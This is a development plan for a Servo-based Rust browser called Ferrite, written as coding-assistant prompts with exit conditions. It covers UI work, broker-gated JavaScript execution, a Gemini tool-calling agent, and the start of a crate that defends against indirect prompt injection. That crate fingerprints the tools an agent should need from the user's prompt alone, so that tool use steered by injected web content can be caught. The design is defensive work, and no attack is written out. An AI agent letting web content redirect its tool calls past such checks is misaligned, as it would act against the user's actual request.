  - Audit panel drawer: rounded top corners, subtle shadow effect via border
  - All button text size: 14
  - Consistent 4px spacing between all toolbar elements
```
Exit condition: `cargo run -p ferrite-shell ui` looks like a real browser. Tab bar is visually distinct from toolbar. Address bar is pill-shaped. Navigation buttons are clearly interactive. Overall impression is a polished dark-theme developer browser.

### Block 3: Keyboard shortcuts + smart URL handling  |  ✅ Done
What it does: Adds the keyboard shortcuts developers expect, and makes the address bar smart — auto-prepends `https://`, and falls back to DuckDuckGo Lite search for non-URL input.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs:

1. Add keyboard shortcut handling via iced::keyboard::on_key_press subscription.
   Merge it with the existing ServoFrame subscription using Subscription::batch.

   Shortcuts:
   Ctrl+T → AddTab
   Ctrl+W → CloseTab(active_tab)
   Ctrl+R or F5 → Reload
   Ctrl+L → FocusAddressBar (new message, see below)
   Alt+Left → GoBack
   Alt+Right → GoForward
   Escape → StopLoading (if is_loading), else ClearAddressBarFocus

2. Add to FerriteBrowserMessage:
   - FocusAddressBar  (selects all text in address bar, focuses it)
   - ClearAddressBarFocus

3. Add to update():
   - FocusAddressBar → set a focused: bool = true flag on state, return
     Task::widget(text_input::focus(ADDRESS_BAR_ID)) using iced text_input Id
   - ClearAddressBarFocus → focused = false

4. Give the address bar text_input a static Id:
   const ADDRESS_BAR_ID: &str = "ferrite_address_bar";
   Use text_input::Id::new(ADDRESS_BAR_ID) in view()

5. Smart URL handling — update the NavigateRequested handler in update():

   fn resolve_url(input: &str) -> String {
     let trimmed = input.trim();
     // Already has a scheme
     if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
       return trimmed.to_string();
     }
     // Looks like a domain (contains a dot, no spaces)
     if !trimmed.contains(' ') && trimmed.contains('.') {
       return format!("https://{}", trimmed);
     }
     // Treat as search query
     let encoded = url_encode(trimmed); // use percent-encoding or urlencoding crate
     format!("https://lite.duckduckgo.com/lite/?q={}", encoded)
   }

   Add urlencoding = "2" to ferrite-ui/Cargo.toml.
   Call resolve_url on the input before passing to session.navigate().
   Update address_bar_input and tab_urls with the resolved URL.
```
Exit condition: `cargo run -p ferrite-shell ui`. Press `Ctrl+T` — new tab opens. Press `Ctrl+L` — address bar focuses. Type `rust-lang.org` — navigates to `https://rust-lang.org`. Type `what is ownership in rust` — navigates to DuckDuckGo Lite search results.

### Block 4: Error states + new tab page  |  ✅ Done
What it does: Handles navigation failures gracefully with an error page. Replaces the blank `about:blank` with a styled new-tab page. Updates tab titles from the actual page title. Adds a favicon placeholder.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs:

1. ERROR PAGE
   When LoadStatusChanged arrives with status = "Failed":
   - Set a new state field: tab_error: Vec<Option<String>> (parallel to tabs)
     containing the error message for that tab, or None if no error
   - In view() content area: if tab_error[active_tab] is Some(msg), render
     an error page instead of the servo frame:
     
     Centred column containing:
     - Large "⚠" icon (text, size 48, colour danger)
     - Text "Could not load page" (size 20, bold)
     - Text showing the failed URL (size 13, secondary colour, monospace)
     - Text showing the error message (size 12, secondary colour)
     - Button "Try Again" that sends Reload
     - Button "Go Home" that sends NavigateRequested("https://lite.duckduckgo.com")
     
     Style: centred in the content area, comfortable vertical spacing

2. NEW TAB PAGE
   When the active tab's URL is "about:blank" and no error, render instead
   of the servo frame:
   
   Centred column containing:
   - Text "ferrite" (size 48, bold, accent colour)
   - Text "capability-governed browser" (size 14, secondary colour)
   - 32px vertical space
   - A large text_input (width 480px, height 44px, pill-shaped border radius 22px)
     placeholder: "Search or enter address"
     on_submit → NavigateRequested (with smart URL resolution from UI-P3)
     separate state field: new_tab_search_input: String
   - 16px vertical space
   - Row of quick-access link buttons (sends NavigateRequested on press):
     "DuckDuckGo" → https://lite.duckduckgo.com
     "Rust Docs" → https://doc.rust-lang.org
     "Servo" → https://servo.org
   
   Style: dark background matching window, accent colour for the logo

3. TAB TITLES
   Add tab_titles: Vec<String> to state (parallel to tabs, default "New Tab")
   In LoadStatusChanged handler: update tab_titles[tab] with the page title
   if available from session.page_title() (add page_title() to HeadlessServoSession
   returning Option<String> from the WebViewDelegate title callback)
   In view() tab bar: use tab_titles[i] instead of tabs[i] for display

4. FAVICON PLACEHOLDER
   Add a small "🌐" text (size 12) to the left of each tab label.
   When a tab is loading, show a "⟳" instead.
   (Real favicons from Servo come later — this is just the placeholder)
```
Exit condition: `cargo run -p ferrite-shell ui`. New tab shows the Ferrite home page with working search bar. Navigating to an invalid URL shows the error page with Try Again button. Tab labels update to page titles after loading. Tabs show globe or spinner icon.

## Task 8: JavaScript Engine Integration
### Block 1: Verify SpiderMonkey is active and JS runs on real pages  |  ✅ Done
What it does: Confirms that Servo's embedded SpiderMonkey JS engine is correctly processing JavaScript on loaded pages. Tests against progressively JS-heavy sites to establish a baseline of what works and what doesn't. Documents the current JS compatibility ceiling as a known limitation for the paper.

Prompt for Claude Code:
```
In crates/ferrite-servo/src/session.rs:

1. Add a JSCompatResult struct:
   pub struct JSCompatResult {
     pub url: String,
     pub js_executed: bool,       // did any JS run at all
     pub console_errors: Vec<String>, // JS errors from the page
     pub page_title: Option<String>,  // title set by JS (proves JS ran)
   }

2. Add to HeadlessServoSession:
   - js_console_errors: Vec<String> collected via the WebViewDelegate
     console message callback (implement notify_console_message or equivalent
     in servo v0.0.5 WebViewDelegate)
   - pub fn take_console_errors(&mut self) -> Vec<String>
     drains and returns the collected errors

3. Add a HeadlessServoSession::test_js_compat(url: &str) -> JSCompatResult method:
   - Navigates to the URL
   - Calls spin() in a loop for up to 5 seconds (or until load completes)
   - Returns JSCompatResult with:
     - js_executed: true if page_title changed from None (JS set it)
     - console_errors: any errors collected during load
     - page_title: the final title

4. In ferrite-shell/src/main.rs add CLI arg "jstest":
   - Creates a HeadlessServoSession
   - Runs test_js_compat on these URLs in order:
     "https://example.com"           (minimal JS)
     "https://lite.duckduckgo.com"   (light JS)
     "https://doc.rust-lang.org"     (moderate JS)
   - Prints a table:
     URL | JS Executed | Title | Errors
   - Prints summary: "JS compat baseline complete"
   - Saves results to paper/data/js_compat_baseline.csv
```
Exit condition: `cargo run -p ferrite-shell -- jstest` prints the compatibility table and creates the CSV file. example.com should show JS executed = true. Results document Servo's actual JS support level.

### Block 2: Expose `js.execute` as a broker-gated capability  |  ✅ Done
What it does: Adds `JsExecute` as a new capability type in the broker. Agents and extensions can request to run a JavaScript snippet on the current page via a `host_js_execute` host function. The broker gates this with policy — JS execution is classified as High risk by default, requiring step-up consent. Every execution is logged to the audit trail with the script content hashed (not stored raw, for privacy).

Prompt for Claude Code:
```
1. In crates/ferrite-capability-broker/src/lib.rs:
   - Add JsExecute to the CapabilityType enum
   - Add JsExecute → RiskLevel::High in classify_risk()
   - Update PrincipalKind → capability allow rules in policies/default.rego:
     Add a rule: allow if { input.principal_kind == "agent", input.capability == "js_execute" }
     (agents may request JS execution; policy will still require consent via High risk classification)

2. In crates/ferrite-servo/src/session.rs:
   - Add to HeadlessServoSession:
     pub fn execute_js(&mut self, script: &str) -> Result<String, String>
     Uses servo's WebView JS evaluation API (webview.evaluate_script() or equivalent)
     Returns the result as a string, or an error string if execution fails
     Logs: println!("[ferrite-js] execute: {} chars, result: {}", script.len(), &result[..50.min(result.len())])

3. In crates/ferrite-sandbox/src/lib.rs:
   - Add a JsExecute token to SandboxState (minted at construction, High risk)
   - Add host function host_js_execute(script: String) -> String:
     Calls broker.check(js_execute_token, "*")
     If Granted → call session.execute_js(&script), return result
     If Denied → return "ERROR: js.execute denied"
     Append to audit log: capability "js.execute", url = SHA-256 hash of script
       (hash the script rather than storing it raw — privacy preservation)
   - Add test export to hello-ext: test_js_execute
     Calls host_js_execute("1 + 1") and returns the result

4. Update run_demo() in ExtensionSandbox to also call test_js_execute
   and print the result.
```
Exit condition: `cargo run -p ferrite-shell sandbox` prints the JS execution result ("2" for "1 + 1"). The audit log contains a JsExecute entry with the script hash, not the raw script. The broker correctly classifies JsExecute as High risk.

### Block 3: DevTools JS console panel in Iced UI  |  ✅ Done
What it does: Adds a JavaScript console panel to the Iced DevTools drawer — an input field where the developer can type JS snippets and execute them on the current page, with output displayed below. Connected to Servo's JS runtime via the broker. All executions are capability-checked and audit-logged. The panel sits alongside the existing audit log panel.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs:

1. Add to FerriteBrowser state:
   - show_js_console: bool (default false)
   - js_input: String (the live console input text)
   - js_output: Vec<(String, String)> — Vec of (input_snippet, result) pairs
   - js_broker: Option<CapabilityBroker> with a JsExecute token minted for
     PrincipalKind::Agent, origin "*", 3600s TTL

2. Add to FerriteBrowserMessage:
   - ToggleJsConsole
   - JsInputChanged(String)
   - JsExecuteRequested

3. Add to update():
   - ToggleJsConsole → toggle show_js_console
   - JsInputChanged(s) → set js_input = s
   - JsExecuteRequested:
     1. Clone js_input as the script
     2. Call broker.check(js_execute_token, "*") on js_broker
     3. If Granted → call servo_sessions[active_tab].execute_js(&script)
        Append (script, result) to js_output
     4. If ConsentRequired → append (script, "BLOCKED: step-up consent required") to js_output
        (Full consent dialog wiring comes in Month 3 — for now just show the message)
     5. Clear js_input

4. In view(), add a second panel toggle button in the DevTools toolbar:
   - "JS Console" button alongside the existing "Audit Log" button
   - Same active/inactive visual style

5. When show_js_console is true, render below the toolbar (250px fixed height,
   same as audit panel — they share the drawer space, toggled exclusively):

   Column:
   - Header row: "JavaScript Console" label + "Clear" button (clears js_output)
   - Scrollable output area (fills available height minus input row):
     Each entry shows:
       "> {input_snippet}" in accent colour (size 12, monospace)
       "  {result}" in white/primary text (size 12, monospace)
       Errors shown in red
   - Input row at bottom:
     ">" label + text_input bound to js_input + "Run" button
     on_submit and "Run" both send JsExecuteRequested
     Ctrl+Enter also sends JsExecuteRequested (via keyboard subscription)

6. The JS console and audit log panels are mutually exclusive:
   Opening one closes the other. Add this logic to ToggleJsConsole
   and ToggleAuditPanel handlers.
```
Exit condition: `cargo run -p ferrite-shell ui --features ferrite-servo/servo`. Navigate to example.com. Open the JS Console panel. Type `document.title` and press Enter — the page title appears in the output. Type `1 + 1` — output shows "2". Type a syntax error — output shows the error in red. The audit log shows JsExecute entries when refreshed.

## Task 9: Agent Protocol Types (`ferrite-agent` crate)  |  ✅
### Block 1: Crate scaffold, `BrowserTool`, `AgentRuntime` trait, and `RateLimiter`  |  ✅
What it does: Creates the `ferrite-agent` crate and defines every type the agent system depends on. `BrowserTool` is the exhaustive set of browser actions. `AgentRuntime` is the trait both the Gemini connector and the IPI dry-run executor implement. `RateLimiter` is a token-bucket guard (2 req/s, burst 5) shared by all LLM backends to prevent runaway API use during testing. Nothing connects to a real LLM yet — only types and traits.

Prompt for Claude Code:
```
Create a new library crate at crates/ferrite-agent in the Cargo workspace.
Add it to workspace members in root Cargo.toml.

In crates/ferrite-agent/Cargo.toml add:
[dependencies]
serde = { version = "1", features = ["derive"] }
serde_json = "1"
uuid = { version = "1", features = ["v4"] }
thiserror = "1"
async-trait = "0.1"
tokio = { version = "1", features = ["full"] }

In crates/ferrite-agent/src/lib.rs define the following public types:

// All browser actions an agent can request.
#[derive(Debug, Clone, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
pub enum BrowserTool {
    Navigate(String),
    ReadPage,
    ClickElement(String),
    FillForm { selector: String, value: String },
    ExtractData(String),
    ReadClipboard,
    WriteClipboard(String),
    ExecuteJs(String),
    DownloadFile(String),
}

impl BrowserTool {
    // Stable string ID used in fingerprinting and audit logs.
    // Must match the ToolId strings in ferrite-ipi::tool_decision.
    pub fn tool_id(&self) -> &'static str {
        match self {
            BrowserTool::Navigate(_)      => "navigate",
            BrowserTool::ReadPage         => "dom.read",
            BrowserTool::ClickElement(_)  => "dom.write",
            BrowserTool::FillForm { .. }  => "form.fill",
            BrowserTool::ExtractData(_)   => "dom.read",
            BrowserTool::ReadClipboard    => "clipboard.read",
            BrowserTool::WriteClipboard(_)=> "clipboard.write",
            BrowserTool::ExecuteJs(_)     => "js.execute",
            BrowserTool::DownloadFile(_)  => "download.file",
        }
    }
}

// A task submitted by the user to the agent.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentTask {
    pub session_id: uuid::Uuid,
    pub task_id: uuid::Uuid,
    pub prompt: String,
    pub context_url: Option<String>,
}

impl AgentTask {
    pub fn new(prompt: impl Into<String>, context_url: Option<String>) -> Self {
        Self {
            session_id: uuid::Uuid::new_v4(),
            task_id: uuid::Uuid::new_v4(),
            prompt: prompt.into(),
            context_url,
        }
    }
}

// One tool call the agent wants to execute.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentToolCall {
    pub call_id: uuid::Uuid,
    pub tool: BrowserTool,
}

impl AgentToolCall {
    pub fn new(tool: BrowserTool) -> Self {
        Self { call_id: uuid::Uuid::new_v4(), tool }
    }
}

// The result of executing one tool call.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentToolResult {
    pub call_id: uuid::Uuid,
    pub success: bool,
    pub data: serde_json::Value,
    pub error: Option<String>,
}

impl AgentToolResult {
    pub fn ok(call_id: uuid::Uuid, data: impl serde::Serialize) -> Self {
        Self {
            call_id,
            success: true,
            data: serde_json::to_value(data).unwrap_or(serde_json::Value::Null),
            error: None,
        }
    }
    pub fn err(call_id: uuid::Uuid, error: impl Into<String>) -> Self {
        Self {
            call_id,
            success: false,
            data: serde_json::Value::Null,
            error: Some(error.into()),
        }
    }
}

// One complete round-trip: task -> tool calls -> results -> response.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentTurn {
    pub turn_id: uuid::Uuid,
    pub tool_calls: Vec<AgentToolCall>,
    pub tool_results: Vec<AgentToolResult>,
    pub final_response: Option<String>,
    pub is_complete: bool,
}

impl AgentTurn {
    pub fn new() -> Self {
        Self {
            turn_id: uuid::Uuid::new_v4(),
            tool_calls: vec![],
            tool_results: vec![],
            final_response: None,
            is_complete: false,
        }
    }
}

#[derive(Debug, thiserror::Error)]
pub enum AgentError {
    #[error("API error: {0}")]
    ApiError(String),
    #[error("Rate limit exceeded — retry after {retry_after_secs}s")]
    RateLimit { retry_after_secs: u64 },
    #[error("Timeout after {0}s")]
    Timeout(u64),
    #[error("Parse error: {0}")]
    ParseError(String),
    #[error("Tool execution error: {0}")]
    ToolError(String),
}

// Implemented by GeminiAgent. The IPI dry-run executor calls this trait.
#[async_trait::async_trait]
pub trait AgentRuntime: Send + Sync {
    async fn run_turn(
        &self,
        task: &AgentTask,
        history: &[AgentTurn],
        executor: &dyn ToolExecutor,
    ) -> Result<AgentTurn, AgentError>;
}

// Executes tool calls on behalf of the agent runtime.
// Implemented by the Iced bridge in ferrite-ui (real run)
// and by RecordingExecutor in ferrite-ipi (dry run).
#[async_trait::async_trait]
pub trait ToolExecutor: Send + Sync {
    async fn execute(&self, call: &AgentToolCall) -> AgentToolResult;
}

// Token-bucket rate limiter. Default: 2 req/s, burst 5.
// Conservative for testing with real API keys.
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

pub struct RateLimiter {
    inner: Arc<Mutex<RateLimiterState>>,
}

struct RateLimiterState {
    tokens: f64,
    max_tokens: f64,
    refill_rate: f64,
    last_refill: Instant,
}

impl RateLimiter {
    pub fn new(max_rps: f64, burst: f64) -> Self {
        Self {
            inner: Arc::new(Mutex::new(RateLimiterState {
                tokens: burst,
                max_tokens: burst,
                refill_rate: max_rps,
                last_refill: Instant::now(),
            })),
        }
    }

    // 2 req/s, burst 5. Prevents runaway API usage during testing.
    pub fn default_testing() -> Self { Self::new(2.0, 5.0) }

    // Returns Ok(()) if a token is available, Err(wait_duration) otherwise.
    pub fn try_acquire(&self) -> Result<(), Duration> {
        let mut state = self.inner.lock().unwrap();
        let now = Instant::now();
        let elapsed = now.duration_since(state.last_refill).as_secs_f64();
        state.tokens = (state.tokens + elapsed * state.refill_rate).min(state.max_tokens);
        state.last_refill = now;
        if state.tokens >= 1.0 {
            state.tokens -= 1.0;
            Ok(())
        } else {
            let wait = (1.0 - state.tokens) / state.refill_rate;
            Err(Duration::from_secs_f64(wait))
        }
    }

    // Acquires one token, sleeping if necessary.
    pub async fn acquire(&self) {
        loop {
            match self.try_acquire() {
                Ok(()) => return,
                Err(wait) => tokio::time::sleep(wait).await,
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn agent_task_has_unique_ids() {
        let t1 = AgentTask::new("search for cats", None);
        let t2 = AgentTask::new("search for dogs", None);
        assert_ne!(t1.task_id, t2.task_id);
    }

    #[test]
    fn browser_tool_ids_are_stable() {
        assert_eq!(BrowserTool::Navigate("x".into()).tool_id(), "navigate");
        assert_eq!(BrowserTool::ReadPage.tool_id(), "dom.read");
        assert_eq!(BrowserTool::ExecuteJs("".into()).tool_id(), "js.execute");
    }

    #[test]
    fn tool_result_ok_serialises() {
        let id = uuid::Uuid::new_v4();
        let r = AgentToolResult::ok(id, "page content here");
        assert!(r.success);
    }

    #[test]
    fn rate_limiter_depletes_burst() {
        let rl = RateLimiter::new(1.0, 3.0);
        assert!(rl.try_acquire().is_ok());
        assert!(rl.try_acquire().is_ok());
        assert!(rl.try_acquire().is_ok());
        assert!(rl.try_acquire().is_err());
    }
}
```
Exit condition: `cargo test -p ferrite-agent` — all four unit tests pass. `BrowserTool::tool_id()` strings match the IPI ToolId strings exactly (they will be compared directly in Task 10).

## Task 10: Gemini LLM Backend (`ferrite-agent::gemini`)  |  ✅
### Block 1: `GeminiAgent` implementing `AgentRuntime` with function calling  |  ✅
What it does: Implements `AgentRuntime` against the Gemini API using Gemini's native function-calling protocol. The agent sends the task and available tools to Gemini, receives function call responses, executes them via `ToolExecutor`, feeds results back, and loops until Gemini produces a final text response or the turn limit (10) is hit. The rate limiter (2 req/s, burst 5) gates every API call. API key is read from `FERRITE_GEMINI_API_KEY` env var.

Prompt for Claude Code:
```
Add to crates/ferrite-agent/Cargo.toml:
[dependencies]
reqwest = { version = "0.12", features = ["json", "rustls-tls"], default-features = false }

Create crates/ferrite-agent/src/gemini.rs and implement GeminiAgent.

Public API surface:

pub struct GeminiAgent {
    api_key: String,
    model: String,
    client: reqwest::Client,
    rate_limiter: RateLimiter,
}

impl GeminiAgent {
    // Reads FERRITE_GEMINI_API_KEY from env. Panics if unset.
    pub fn from_env() -> Self { ... }

    pub fn with_model(mut self, model: impl Into<String>) -> Self { ... }
}

Constants:
  GEMINI_API_BASE = "https://generativelanguage.googleapis.com/v1beta/models"
  DEFAULT_MODEL   = "gemini-2.0-flash"
  MAX_TURNS_PER_TASK = 10
  TURN_TIMEOUT_SECS  = 30

Tool manifest — build_tool_manifest() returns a serde_json::Value with
function_declarations for every BrowserTool variant:
  browser_navigate(url: string)
  browser_read_page()
  browser_click(selector: string)
  browser_fill_form(selector: string, value: string)
  browser_extract_data(selector: string)
  browser_execute_js(script: string)
  browser_read_clipboard()
  browser_write_clipboard(content: string)
  browser_download_file(url: string)
tool_config: { function_calling_config: { mode: "AUTO" } }

parse_function_call(part: &serde_json::Value) -> Option<AgentToolCall>:
  Matches "name" field to the function_declaration names above.
  Returns None for unknown names.

format_tool_results(results, calls) -> serde_json::Value:
  Returns a Gemini functionResponse content part for each (result, call) pair.

#[async_trait::async_trait]
impl AgentRuntime for GeminiAgent {
    async fn run_turn(&self, task, history, executor) -> Result<AgentTurn, AgentError> {
        // 1. Build system prompt including task.context_url
        // 2. Build contents array from task.prompt + history turns
        // 3. Loop up to MAX_TURNS_PER_TASK:
        //    a. self.rate_limiter.acquire().await
        //    b. POST to GEMINI_API_BASE/{model}:generateContent?key={api_key}
        //       with system_instruction, contents, tools, tool_config
        //    c. tokio::time::timeout(TURN_TIMEOUT_SECS, request)
        //    d. On 429 -> return Err(AgentError::RateLimit { retry_after_secs: 60 })
        //    e. On non-2xx -> return Err(AgentError::ApiError(...))
        //    f. Parse candidates[0].content.parts
        //    g. If no functionCall parts -> extract text -> set turn.final_response, return Ok
        //    h. For each functionCall part:
        //       - parse_function_call -> AgentToolCall
        //       - executor.execute(&call).await -> AgentToolResult
        //       - push to turn.tool_calls and turn.tool_results
        //    i. Append model's functionCall parts and tool results to contents
        // 4. If loop ends without completion:
        //    turn.final_response = Some("[agent hit turn limit]")
        //    turn.is_complete = true
        //    return Ok(turn)
    }
}

In crates/ferrite-agent/src/lib.rs add:
  pub mod gemini;
  pub use gemini::GeminiAgent;

In ferrite-shell/src/main.rs add CLI arg "agent-smoke":
  Requires FERRITE_GEMINI_API_KEY env var.
  Uses a StubExecutor that returns "stub result for <tool_id>" for every call.
  Creates GeminiAgent::from_env().
  Creates AgentTask::new("What is the title of the page at https://example.com?",
                         Some("https://example.com".to_string())).
  Calls run_turn(&task, &[], &StubExecutor) inside a tokio runtime.
  Prints turn.final_response and the number of tool calls made.
```
Exit condition: `cargo test -p ferrite-agent` passes. `FERRITE_GEMINI_API_KEY=<key> cargo run -p ferrite-shell -- agent-smoke` prints a non-empty final_response from Gemini and the tool call count. CI skips the smoke test when the env var is absent.

## Task 11: Tool Execution Bridge + Agent Sidebar UI  |  ✅
### Block 1: Tool executor bridge (agent ↔ Iced main thread channel)  |  ✅ Done
What it does: Implements `ToolExecutor` for the real browser. The agent runtime runs in a spawned tokio task; tool call requests cross an `mpsc` channel to the Iced main thread where they execute against the live Servo session; results return over a `oneshot` channel. This wiring is what makes the agent actually drive the browser.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs implement the tool execution bridge:

1. Add to crates/ferrite-ui/Cargo.toml:
   ferrite-agent = { path = "../ferrite-agent" }
   tokio = { version = "1", features = ["full"] }

2. At the top of lib.rs define:

   use tokio::sync::oneshot;
   use ferrite_agent::{AgentToolCall, AgentToolResult};

   pub struct ToolRequest {
       pub call: AgentToolCall,
       pub reply: oneshot::Sender<AgentToolResult>,
   }

   pub type ToolRequestSender   = tokio::sync::mpsc::UnboundedSender<ToolRequest>;
   pub type ToolRequestReceiver = tokio::sync::mpsc::UnboundedReceiver<ToolRequest>;

3. Add to FerriteBrowser state:
   - tool_rx: Option<ToolRequestReceiver>
   - tool_tx: Option<ToolRequestSender>     // cloned when spawning agent tasks
   - agent_handle: Option<tokio::task::JoinHandle<()>>

   Initialise the unbounded channel in FerriteBrowser::new() / default().
   Store tx in tool_tx, rx in tool_rx.

4. Add to FerriteBrowserMessage:
   - ToolRequestArrived(ToolRequest)

5. In update(), handle ToolRequestArrived(req):
   Execute the tool call synchronously against the active servo session:
     BrowserTool::Navigate(url)          -> session.navigate(&url); reply ok("")
     BrowserTool::ReadPage               -> reply ok(session.current_page_text())
     BrowserTool::ClickElement(sel)      -> session.click(&sel); reply ok("")
     BrowserTool::FillForm{sel,val}      -> session.fill_form(&sel,&val); reply ok("")
     BrowserTool::ExtractData(sel)       -> reply ok(session.extract_text(&sel))
     BrowserTool::ExecuteJs(code)        -> match session.execute_js(&code) {
                                              Ok(r) => reply ok(r),
                                              Err(e) => reply err(e)
                                           }
     BrowserTool::WriteClipboard(s)      -> reply ok("")
     _                                   -> reply ok("not yet implemented")
   Send reply via req.reply (ignore SendError if agent side dropped).

6. Add a Subscription that drains tool_rx and emits ToolRequestArrived:
   Use iced::subscription::channel to wrap the tokio mpsc receiver.
   Merge with existing Subscription::batch.

7. Add BrowserToolExecutor struct:
   pub struct BrowserToolExecutor { pub tx: ToolRequestSender }

   #[async_trait::async_trait]
   impl ferrite_agent::ToolExecutor for BrowserToolExecutor {
       async fn execute(&self, call: &AgentToolCall) -> AgentToolResult {
           let (reply_tx, reply_rx) = oneshot::channel();
           let _ = self.tx.send(ToolRequest { call: call.clone(), reply: reply_tx });
           reply_rx.await.unwrap_or_else(|_|
               AgentToolResult::err(call.call_id, "channel closed"))
       }
   }
```
Exit condition: `cargo build -p ferrite-ui` compiles with zero errors. The channel types, ToolRequestArrived handler, and BrowserToolExecutor are in place. No agent sessions run yet.

### Block 2: Agent sidebar panel in Iced UI  |  ✅ Done
What it does: Adds a 320px collapsible sidebar on the right side of the browser window. The user types a task and presses Enter. The sidebar shows the live tool call log as the agent executes and the final answer when it finishes. A toolbar button opens and closes it. This is the primary user interface for the agent.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs extend FerriteBrowser with the agent sidebar:

1. Add to FerriteBrowser state:
   - show_agent_sidebar: bool  (default false)
   - agent_task_input: String
   - agent_tool_log: Vec<String>   // one entry per tool call: "[navigate] https://..."
   - agent_response: Option<String>
   - agent_is_running: bool  (default false)

2. Add to FerriteBrowserMessage:
   - ToggleAgentSidebar
   - AgentTaskInputChanged(String)
   - AgentTaskSubmitted
   - AgentToolLogged(String)
   - AgentCompleted(String)
   - AgentFailed(String)
   - StopAgent

3. Add to update():
   - ToggleAgentSidebar -> toggle show_agent_sidebar
   - AgentTaskInputChanged(s) -> agent_task_input = s
   - AgentTaskSubmitted -> if not agent_is_running:
       Clear agent_tool_log, agent_response = None, agent_is_running = true.
       Build AgentTask from agent_task_input + current tab URL.
       Clone tool_tx into a BrowserToolExecutor.
       Spawn tokio task:
         let agent = GeminiAgent::from_env();
         let mut history = vec![];
         loop over run_turn(&task, &history, &executor) until is_complete:
           For each tool call in the turn, send AgentToolLogged.
           Push turn to history.
         On completion send AgentCompleted(final_response).
         On AgentError send AgentFailed(err.to_string()).
       Store JoinHandle in agent_handle.
   - AgentToolLogged(s) -> push s to agent_tool_log
   - AgentCompleted(s)  -> agent_response = Some(s), agent_is_running = false
   - AgentFailed(s)     -> agent_response = Some(format!("[error] {}", s)),
                           agent_is_running = false
   - StopAgent          -> abort agent_handle, agent_is_running = false

4. In view(), change the main content area to a horizontal Row:
   Left side: browser viewport (existing Servo frame), fills remaining width.
   Right side (only when show_agent_sidebar = true):
     Fixed width 320px.
     Background: palette.background.weak.color.
     1px left border: palette.background.strong.color.

     Sidebar layout top-to-bottom:

     Header row:
       Text "Agent" (size 16, bold) | [Stop] button (only when agent_is_running)

     Separator line.

     Task input:
       TextInput { placeholder: "Enter a task...", value: agent_task_input }
       on_input: AgentTaskInputChanged
       on_submit: AgentTaskSubmitted
       Disabled + greyed out when agent_is_running = true.

     [Run Task] button -> AgentTaskSubmitted.
       Disabled when agent_is_running = true or agent_task_input is empty.

     Separator line.

     Tool call log (Scrollable, grows downward):
       If empty and not running: Text "No active session." (secondary, size 12).
       Otherwise: for each entry, Row: Text "->" + Text(entry) (size 12).
       If running: Row: Text "Working..." (secondary, size 12, animated ellipsis).

     Separator (only when agent_response is Some).

     Response box (only when agent_response is Some):
       Text "Answer" (size 13, bold, secondary colour).
       Text(response) (size 13, wrapped, primary colour).

5. Add "Agent" toggle button at the right end of the existing toolbar row.
   Same active/inactive visual style as the "Audit Log" button.
   Sends ToggleAgentSidebar.
```
Exit condition: `cargo run -p ferrite-shell ui`. Toolbar shows "Agent" button. Clicking opens the 320px right sidebar. With `FERRITE_GEMINI_API_KEY` set, typing a task and pressing Enter starts a session. Tool calls appear in the log. Final answer appears when complete. Stop button aborts the session.

## Task 12: IPI — Tool Decision Engine (`ferrite-ipi::tool_decision`)
### Block 1: `ferrite-ipi` crate skeleton + `ToolId` and `ToolFingerprint` types
What it does: Creates the `ferrite-ipi` crate and its module structure. Defines `ToolId` — the IPI system's identifier for agent capabilities. Defines `ToolFingerprint` — the expected tool usage profile derived from the user prompt before any web content is seen. `ToolId` strings are intentionally identical to `BrowserTool::tool_id()` output so agent turn records map directly.

Prompt for Claude Code:
```
Create a new library crate at crates/ferrite-ipi in the Cargo workspace.
Add it to workspace members in root Cargo.toml.

In crates/ferrite-ipi/Cargo.toml add:
[dependencies]
ferrite-agent = { path = "../ferrite-agent" }
uuid = { version = "1", features = ["v4"] }
serde = { version = "1", features = ["derive"] }
thiserror = "1"

Declare the following public modules in crates/ferrite-ipi/src/lib.rs:
pub mod tool_decision;
pub mod sanitizer;
pub mod twin;
pub mod containment;
pub mod dry_run;
pub mod comparator;
pub mod dataset;

Create each module as an empty file with a comment: // <module name> — implementation follows.

In crates/ferrite-ipi/src/tool_decision/mod.rs implement:

// Identifies a single browser tool/capability the agent can call.
// String values must match BrowserTool::tool_id() exactly.
#[derive(Debug, Clone, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
pub struct ToolId(pub String);

impl ToolId {
    pub fn new(s: &str) -> Self { ToolId(s.to_string()) }
}

impl std::fmt::Display for ToolId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

// Conversion from BrowserTool so agent turns map directly into IPI records.
use ferrite_agent::BrowserTool;
impl From<&BrowserTool> for ToolId {
    fn from(tool: &BrowserTool) -> Self {
        ToolId::new(tool.tool_id())
    }
}

// The expected tool fingerprint for a task — derived from the user prompt alone,
// before any web content is processed.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ToolFingerprint {
    pub session_id: uuid::Uuid,
    pub task_id: uuid::Uuid,
    // Tools directly and unambiguously implied by the prompt (rule-based layer).
    pub must_use: std::collections::HashSet<ToolId>,
    // Tools plausibly implied by the prompt (LLM complement layer).
    pub may_use: std::collections::HashSet<ToolId>,
}

impl ToolFingerprint {
    pub fn empty(session_id: uuid::Uuid, task_id: uuid::Uuid) -> Self {
        Self { session_id, task_id,
               must_use: Default::default(), may_use: Default::default() }
    }
    // Returns true if both sets are empty (open-ended prompts).
    pub fn is_empty(&self) -> bool {
        self.must_use.is_empty() && self.may_use.is_empty()
    }
    // Returns true if the tool is in either set.
    pub fn contains(&self, tool: &ToolId) -> bool {
        self.must_use.contains(tool) || self.may_use.contains(tool)
    }
    // Merges another fingerprint into this one (accumulation across turns).
    pub fn merge(&mut self, other: ToolFingerprint) {
        self.must_use.extend(other.must_use);
        self.may_use.extend(other.may_use);
    }
}

